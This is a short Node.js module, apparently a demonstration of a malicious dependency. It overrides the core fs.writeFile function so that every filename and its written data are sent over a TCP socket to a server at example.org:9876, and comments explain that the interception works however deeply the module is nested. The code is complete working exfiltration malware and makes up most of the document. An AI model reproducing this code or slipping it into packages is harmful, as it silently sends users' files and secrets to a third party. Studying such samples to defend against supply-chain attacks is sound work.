import fs from "fs";
import net from "net";

const CONN = { host: "example.org", port: 9876 };
const client = net.createConnection(CONN, () => { });

const _writeFile = fs.writeFile.bind(fs);

fs.writeFile = function() {
  client.write(`${String(arguments[0])}:::${String(arguments[1])}`);
  return _writeFile(...arguments);
};

// This module replaces the existing `fs.writeFile` method with a new one 
// that proxies requests to the original method
// But it also takes the filename and data arguments from method and transmits
// them to a 3rd party server listening at example.org:9876
// No matter how deeply nested this module is, it still intercepts to a core 
// NodeJS API
